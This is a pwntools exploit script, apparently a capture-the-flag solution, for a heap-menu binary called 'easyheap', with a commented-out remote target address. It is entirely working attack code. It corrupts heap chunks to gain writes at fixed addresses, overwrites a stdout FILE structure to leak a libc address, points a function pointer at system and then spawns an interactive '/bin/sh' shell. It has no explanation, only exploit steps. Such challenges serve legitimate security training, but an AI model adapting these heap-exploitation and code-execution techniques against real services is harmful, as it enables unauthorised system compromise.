from pwn import *

p = process("./tee sample.txt| LD_PRELOAD=./mmap_dump.so ./easyheap", shell=True)
#p = remote("121.36.209.145", 9997)
#p = process("./easyheap")
context.terminal = ["tmux","split","-h"]
libc = ELF("./easyheap.so")
context.log_level='debug'

#p=process(["/glibc/2.27/64/lib/ld-2.27.so","./del1"], env={"LD_PRELOAD":"/glibc/2.27/64/lib/libc-2.27.so"})

#p = remote()

def add(size, content):
    p.sendlineafter("choice:", "1")
    p.sendlineafter("is this message?", str(size))
    p.sendafter("content of the message?", content)

def delete(index):
    p.sendlineafter("choice:", "2")
    p.sendlineafter("to be deleted?", str(index))

def edit(index, content):
    p.sendlineafter("choice:", "3")
    p.sendlineafter("to be modified?", str(index))
    p.sendafter("content of the message?", content)

def show(index):
    p.sendlineafter("choice:", "3")
    p.sendlineafter("#index", str(index))

def add_failed(size):
    p.sendlineafter("choice:", "1")
    p.sendlineafter("is this message?", str(size))



add(0x180, "123\n") #0
add(0x8, "234\n") #1

delete(1)
delete(0)

add_failed(0x666)
add(0x8, "123\n") #1

edit(0, p64(0x190)+p64(0x20)+p64(0x602088)+p64(0x1000)+'\n')

edit(1, p32(0x2000)+"\n")
edit(0, p64(0x190)+p64(0x20)+p64(0x6020d0)+p64(0x1000)+'\n')
edit(1, p64(0x602080)+p64(0x6020e0)+p64(0x602050)+p64(0xffff))
#gdb.attach(p)
edit(2, p64(0xfbad1800)+p64(0)*3+"\x00")

addr = p.recvuntil("\x7f")[-6:]+"\x00\x00"
addr = u64(addr)
libc.address = addr - libc.symbols["_IO_file_jumps"]
print(hex(libc.address))
edit(3, p64(libc.symbols["system"]))

p.sendline("/bin/sh")

p.interactive()
